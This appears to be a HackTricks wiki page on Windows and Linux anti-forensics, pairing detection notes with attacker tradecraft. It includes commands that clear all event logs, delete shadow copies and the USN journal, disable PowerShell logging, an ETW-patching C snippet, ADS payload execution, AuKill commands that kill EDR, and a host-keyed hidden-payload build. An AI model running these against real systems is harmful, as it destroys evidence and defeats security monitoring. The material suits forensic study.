# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

An attacker may be interested in **changing the timestamps of files** to avoid being detected.\
It's possible to find the timestamps inside the MFT in attributes `$STANDARD_INFORMATION` and `$FILE_NAME`.

Both attributes have 4 timestamps: **Modification**, **access**, **creation**, and **MFT registry modification** (MACE or MACB).

**Windows explorer** and other tools show the information from **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

This tool **modifies** the timestamp information inside **`$STANDARD_INFORMATION`** **but** **not** the information inside **`$FILE_NAME`**. Therefore, it's possible to **identify** **suspicious** **activity**.

### Usnjrnl

The **USN Journal** (Update Sequence Number Journal) is a feature of the NTFS (Windows NT file system) that keeps track of volume changes. The [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) tool allows for the examination of these changes.

![](<../../images/image (801).png>)

The previous image is the **output** shown by the **tool** where it can be observed that some **changes were performed** to the file.

### $LogFile

**All metadata changes to a file system are logged** in a process known as [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). The logged metadata is kept in a file named `$LogFile`, located in the root directory of an NTFS file system. Tools such as [LogFileParser](https://github.com/jschicht/LogFileParser) can be used to parse this file and identify changes.

![](<../../images/image (137).png>)

Again, in the output of the tool it's possible to see that **some changes were performed**.

Using the same tool it's possible to identify to **which time the timestamps were modified**:

![](<../../images/image (1089).png>)

- CTIME: File's creation time
- ATIME: File's modification time
- MTIME: File's MFT registry modification
- RTIME: File's access time

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

Another way to identify suspicious modified files would be to compare the time on both attributes looking for **mismatches**.

### Nanoseconds

**NTFS** timestamps have a **precision** of **100 nanoseconds**. Then, finding files with timestamps like 2010-10-10 10:10:**00.000:0000 is very suspicious**.

### SetMace - Anti-forensic Tool

This tool can modify both attributes `$STANDARD_INFORMATION` and `$FILE_NAME`. However, from Windows Vista, it's necessary for a live OS to modify this information.

## Data Hiding

NTFS uses a cluster as the minimum allocation size. If a file uses a cluster and a half, the remaining half is unused until the file is deleted; data can be hidden in this slack space.

There are tools like slacker that allow hiding data in this "hidden" space. However, an analysis of the `$logfile` and `$usnjrnl` can show that some data was added:

![](<../../images/image (1060).png>)

Then, it's possible to retrieve the slack space using tools like FTK Imager. Note that this kind of tool can save the content obfuscated or even encrypted.

## UsbKill

This is a tool that will **turn off the computer if any change in the USB** ports is detected.\
A way to discover this would be to inspect the running processes and **review each python script running**.

## Live Linux Distributions

These distros are **executed inside the RAM** memory. The only way to detect them is **in case the NTFS file-system is mounted with write permissions**. If it's mounted just with read permissions it won't be possible to detect the intrusion.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

It's possible to disable several windows logging methods to make the forensics investigation much harder.

### Disable Timestamps - UserAssist

This is a registry key that maintains dates and hours when each executable was run by the user.

Disabling UserAssist requires two steps:

1. Set two registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` and `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, both to zero in order to signal that we want UserAssist disabled.
2. Clear your registry subtrees that look like `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

This will save information about the applications executed with the goal of improving the performance of the Windows system. However, this can also be useful for forensics practices.

- Execute `regedit`
- Select the file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Right-click on both `EnablePrefetcher` and `EnableSuperfetch`
- Select Modify on each of these to change the value from 1 (or 3) to 0
- Restart

### Disable Timestamps - Last Access Time

Whenever a folder is opened from an NTFS volume on a Windows NT server, the system takes the time to **update a timestamp field on each listed folder**, called the last access time. On a heavily used NTFS volume, this can affect performance.

1. Open the Registry Editor (Regedit.exe).
2. Browse to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Look for `NtfsDisableLastAccessUpdate`. If it doesn’t exist, add this DWORD and set its value to 1, which will disable the process.
4. Close the Registry Editor, and reboot the server.

### Delete USB History

All the **USB Device Entries** are stored in Windows Registry Under the **USBSTOR** registry key that contains sub keys which are created whenever you plug a USB Device into your PC or Laptop. You can find this key here `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Deleting this** you will delete the USB history.\
You may also use the tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) to be sure you have deleted them (and to delete them).

Another file that saves information about the USBs is the file `setupapi.dev.log` inside `C:\Windows\INF`. This should also be deleted.

### Disable Shadow Copies

**List** shadow copies with `vssadmin list shadowstorage`\
**Delete** them running `vssadmin delete shadow`

You can also delete them via GUI following the steps proposed in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

To disable shadow copies [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Open the Services program by typing "services" into the text search box after clicking the Windows start button.
2. From the list, find "Volume Shadow Copy", select it, and then access Properties by right-clicking.
3. Choose Disabled from the "Startup type" drop-down menu, and then confirm the change by clicking Apply and OK.

It's also possible to modify the configuration of which files are going to be copied in the shadow copy in the registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- You can use a **Windows tool**: `cipher /w:C` This will indicate cipher to remove any data from the available unused disk space inside the C drive.
- You can also use tools like [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Expand "Windows Logs" --> Right click each category and select "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Inside the services section disable the service "Windows Event Log"
- `WEvtUtil.exec clear-log` or `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Recent versions of Windows 10/11 and Windows Server keep **rich PowerShell forensic artifacts** under
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).  
Attackers can disable or wipe them on-the-fly:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

### ETW (Event Tracing for Windows) Patch

Endpoint security products rely heavily on ETW. A popular 2024 evasion method is to
patch `ntdll!EtwEventWrite`/`EtwEventWriteFull` in memory so every ETW call returns `STATUS_SUCCESS`
without emitting the event:

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.  
Because the patch is **process-local**, EDRs running inside other processes may miss it.  

### Alternate Data Streams (ADS) Revival

Malware campaigns in 2023 (e.g. **FIN12** loaders) have been seen staging second-stage binaries
inside ADS to stay out of sight of traditional scanners:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Enumerate streams with `dir /R`, `Get-Item -Stream *`, or Sysinternals `streams64.exe`.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver is now routinely used for **anti-forensics** in ransomware
intrusions.  
The open-source tool **AuKill** loads a signed but vulnerable driver (`procexp152.sys`) to
suspend or terminate EDR and forensic sensors **before encryption & log destruction**:

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

The driver is removed afterwards, leaving minimal artifacts.  

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self‑patching compromised services to reduce detection (Linux)
Adversaries increasingly “self‑patch” a service right after exploiting it to both prevent re‑exploitation and suppress vulnerability‑based detections. The idea is to replace vulnerable components with the latest legitimate upstream binaries/JARs, so scanners report the host as patched while persistence and C2 remain.

Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)
- Post‑exploitation, attackers fetched legitimate JARs from Maven Central (repo1.maven.org), deleted vulnerable JARs in the ActiveMQ install, and restarted the broker.
- This closed the initial RCE while maintaining other footholds (cron, SSH config changes, separate C2 implants).

Operational example (illustrative)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
Observed tradecraft combined multiple long‑haul C2 paths and anti‑analysis packaging:
- Password‑protected PyInstaller ELF loaders to hinder sandboxing and static analysis (e.g., encrypted PYZ, temporary extraction under `/_MEI*`).
- Dropbox‑backed C2 using hardcoded OAuth Bearer tokens
- Parallel/backup C2 via tunneling (e.g., Cloudflare Tunnel `cloudflared`), keeping control if one channel is blocked.

### Persistence and “hardening rollback” to maintain access (Linux examples)
Attackers frequently pair self‑patching with durable access paths:
- Cron/Anacron: edits to the `0anacron` stub in each `/etc/cron.*/` directory for periodic execution.

- SSH configuration hardening rollback: enabling root logins and altering default shells for low‑privileged accounts.

- Random, short‑named beacon artifacts (8 alphabetical chars) dropped to disk that also contact cloud C2:


## Linux Anti-Forensics: Targeted “Two‑Face” Binaries (Rust) — Host‑fingerprinted AEAD + Diskless Exec

Goal: ship a single ELF that looks harmless off‑target, but transparently executes a hidden payload only on a specific host, without leaving plaintext on disk and with reduced userland observability.

Core idea
- Build‑time: compress and encrypt the hidden ELF with AEAD (AES‑GCM). Derive the encryption key with HKDF from unique, stable host data. Embed only ciphertext+metadata and a random base key as constants. The harmless ELF is also embedded.
- Runtime: recompute the key from local host data. If decryption/authentication succeeds → exec the hidden ELF; else → exec the harmless one. Off‑target hosts produce the wrong key and GCM auth fails (acting as a stealth switch).

Recommended host data for derivation
- Disk partition UUIDs from `/dev/disk/by-uuid` (sorted). They are random, unique, and stable across reboots. Avoid low‑entropy or unstable signals (UID, CPU model, DMI serials, public IP).

Minimal build/runtime with the twoface crate
- Build environment
```bash
export TWOFACE_HOST_INFO=/path/to/host_partition_uuids.json
export TWOFACE_NORMAL_EXE=/path/to/harmless_elf
export TWOFACE_HIDDEN_EXE=/path/to/hidden_elf
cargo build
```
- Host info JSON (example)
```json
{
  "part_uuids": [
    "02e989c5-32dc-45ad-98f8-f284e9ac23c0",
    "0e2fcda2-5ca1-4e38-841d-68e5d3a46f93",
    "f99b45d8-d76d-48a3-94a2-3b0c6316d899"
  ]
}
```
- build.rs
```rust
use std::io;
fn main() -> io::Result<()> {
    twoface::build::build::<twoface::host::HostPartitionUuids>()
}
```
- Runtime dispatch
```rust
include!(concat!(env!("OUT_DIR"), "/target_exe.rs"));
fn main() -> std::io::Result<!> {
    twoface::run::run::<twoface::host::HostPartitionUuids>(
        NORMAL_EXE,
        HIDDEN_EXE_BLACK,
        HIDDEN_EXE_KEY,
        &HIDDEN_EXE_DERIVATION_SALT,
    )
}
```

Diskless, ephemeral execution to reduce artifacts
- Create an anonymous in‑kernel file with memfd_create, stream decrypted blocks into it, then replace the current image via fexecve. This avoids writing the hidden ELF to disk and avoids holding the full plaintext in memory at once.
- Reduce write traces while filling the memfd:
  - io_uring: submit buffered writes without visible write syscalls in strace (may be unsupported/disabled).
  - mmap: map and memcpy into the file; eliminates write calls at the cost of extra mmap/munmap syscalls and overhead.
  - Fallback: classic write.

## References

- [Synacktiv – Creating a "Two-Face" Rust binary on Linux](https://www.synacktiv.com/en/publications/creating-a-two-face-rust-binary-on-linux.html)
- [synacktiv/twoface (GitHub)](https://github.com/synacktiv/twoface)
- [memfd_create(2) – man7.org](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [fexecve(3) – man7.org](https://man7.org/linux/man-pages/man3/fexecve.3.html)
- [mmap(2) – man7.org](https://man7.org/linux/man-pages/man2/mmap.2.html)
- [Synacktiv – io_uring-based network scanner in Rust](https://www.synacktiv.com/publications/building-a-iouring-based-network-scanner-in-rust)
- [userfaultfd(2) – man7.org](https://man7.org/linux/man-pages/man2/userfaultfd.2.html)
- [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (Mar 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (Jun 2024)](https://redcanary.com/blog/etw-patching-detection)
- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}